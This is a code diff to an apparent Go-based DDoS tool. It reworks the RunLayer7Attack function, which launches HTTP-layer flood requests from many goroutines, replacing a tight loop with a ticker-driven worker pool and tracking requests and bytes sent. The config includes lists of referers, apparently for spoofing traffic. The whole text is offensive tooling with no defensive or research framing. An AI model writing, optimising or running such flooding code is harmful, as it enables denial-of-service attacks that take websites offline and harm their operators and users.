@@ -28,23 +28,49 @@ type Layer7Config struct {
 	Referers   []string
 }
 
-// RunLayer7Attack executes a Layer 7 attack
+// RunLayer7Attack executes a Layer 7 attack with efficient worker pool
 func RunLayer7Attack(cfg *Layer7Config, wg *sync.WaitGroup, stopChan chan struct{}, requestsSent, bytesSent *utils.Counter) {
+	// Use buffered channel for work distribution
+	workChan := make(chan struct{}, cfg.Threads*2)
+
+	// Start worker goroutines
 	for i := range cfg.Threads {
 		wg.Add(1)
 		go func(threadID int) {
 			defer wg.Done()
 
+			// Worker loop - more efficient than tight loop
 			for {
 				select {
 				case <-stopChan:
 					return
-				default:
+				case <-workChan:
 					executeLayer7Method(cfg, requestsSent, bytesSent)
 				}
 			}
 		}(i)
 	}
+
+	// Work producer - fills the work channel
+	go func() {
+		ticker := time.NewTicker(1 * time.Millisecond)
+		defer ticker.Stop()
+
+		for {
+			select {
+			case <-stopChan:
+				close(workChan)
+				return
+			case <-ticker.C:
+				// Try to send work without blocking
+				select {
+				case workChan <- struct{}{}:
+				default:
+					// Channel full, workers are busy
+				}
+			}
+		}
+	}()
 }
 
 func executeLayer7Method(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
